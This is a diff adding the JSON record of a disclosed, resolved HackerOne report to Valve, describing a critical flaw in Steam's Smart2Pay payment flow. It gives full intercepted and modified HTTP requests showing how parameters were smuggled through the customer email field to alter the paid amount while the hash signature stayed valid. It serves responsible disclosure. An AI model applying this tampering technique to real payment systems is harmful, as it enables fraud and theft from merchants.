@@ -1,0 +1,125 @@
+{
+  "id": 1295844,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjk1ODQ0",
+  "url": "https://hackerone.com/reports/1295844",
+  "title": "Modify in-flight data to payment provider Smart2Pay",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2021-08-09T13:18:20.362Z",
+  "submitted_at": "2021-08-09T13:18:20.444Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "drbrix",
+    "url": "/drbrix",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/140/908/f9d441f2309a123f9a66803c44a0c98dcda1db61_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23363,
+    "url": "https://hackerone.com/valve",
+    "handle": "valve",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Valve",
+      "twitter_handle": "",
+      "website": "https://www.valvesoftware.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-08-10T22:05:36.053Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-08-10T22:05:35.972Z",
+  "team_member_agreed_on_going_public_at": "2021-08-10T17:53:40.550Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I have found vulnerability which allows attacker to generate steam wallet balance.\n\nFirstly you will have to change yours steam account email to something like (I will explain why in next steps, amount100 is the important part): \nbrixamount100abc@█████\n\nThen go to https://store.steampowered.com/steamaccount/addfunds and click add add funds.\n\nProceed to payment and select any payment which uses Smart2Pay payment method (przelewy24 in my country).\n\nClick next steps as you would do with normal transaction.\n\nIntercept POST request to https://globalapi.smart2pay.com/\n\nYou should see request like that\n\n```\nPOST / HTTP/1.1\nHost: globalapi.smart2pay.com\nContent-Length: 388\nCache-Control: max-age=0\nSec-Ch-Ua: \"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\"\nSec-Ch-Ua-Mobile: ?0\nUpgrade-Insecure-Requests: 1\nOrigin: https://store.steampowered.com\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: cross-site\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://store.steampowered.com/\nAccept-Encoding: gzip, deflate\nAccept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7\nConnection: close\n\nMerchantID=1102&MerchantTransactionID=███&Amount=2000&Currency=PLN&ReturnURL=https%3A%2F%2Fstore.steampowered.com%2Fpaypal%2Fsmart2pay%2F████%2F&MethodID=12&Country=PL&CustomerEmail=brixamount100abc%40███████&CustomerName=_drbrix_&SkipHPP=1&Description=Steam+Purchase&SkinID=101&Hash=███\n```\n\n\nWe cant change parameters as there is Hash field with signature, however signature is generated like that hash(ALL_FIELDS_NAMES_VALUES_CONTACTED)\n\nFor this request it will look like that:\n\n`hash(MerchantID1102MerchantTransactionID█████Amount2000.....)`\n\nSo with our special email we can move parameters in a way that will change amount for us\n\nFor example, we can change original `Amount=2000` to `Amount2=000` and after contacting it still will be `Amount2000`\n\nThen we can change email from `CustomerEmail=brixamount100abc%40████` to `CustomerEmail=brix&amount=100&ab=c%40█████████` by this we are adding new field amount with our value.\n\nnew request should look like that:\n\n```\nPOST / HTTP/1.1\nHost: globalapi.smart2pay.com\nContent-Length: 388\nCache-Control: max-age=0\nSec-Ch-Ua: \"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\"\nSec-Ch-Ua-Mobile: ?0\nUpgrade-Insecure-Requests: 1\nOrigin: https://store.steampowered.com\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: cross-site\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://store.steampowered.com/\nAccept-Encoding: gzip, deflate\nAccept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7\nConnection: close\n\nMerchantID=1102&MerchantTransactionID=██████&Amount2=000&Currency=PLN&ReturnURL=https%3A%2F%2Fstore.steampowered.com%2Fpaypal%2Fsmart2pay%2F████%2F&MethodID=12&Country=PL&CustomerEmail=brix&amount=100&ab=c%40██████████&CustomerName=_drbrix_&SkipHPP=1&Description=Steam+Purchase&SkinID=101&Hash=█████████\n```\n\nThen just pay 1 $ and you should get your money on steam wallet in few hours/days those are some transactions made with this metod:\n2███████3\n2████9\n\nand this is account i was testing everything on: \nhttp://steamcommunity.com/profiles/7656██████████\n\n## Impact\n\nI think impact is pretty obvious, attacker can generate money and break steam market, sell game keys for cheap etc.",
+  "bounty_amount": "7500.0",
+  "formatted_bounty": "$7,500",
+  "weakness": {
+    "id": 65,
+    "name": "Business Logic Errors"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 431,
+  "voters": [
+    "neon99",
+    "voidx38",
+    "llorenzo",
+    "0xflik",
+    "rejection",
+    "awetz101",
+    "ezzra",
+    "tinmo",
+    "4ft3rd4rk",
+    "crtech",
+    "and 421 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 2293,
+    "asset_type": "URL",
+    "asset_identifier": "store.steampowered.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
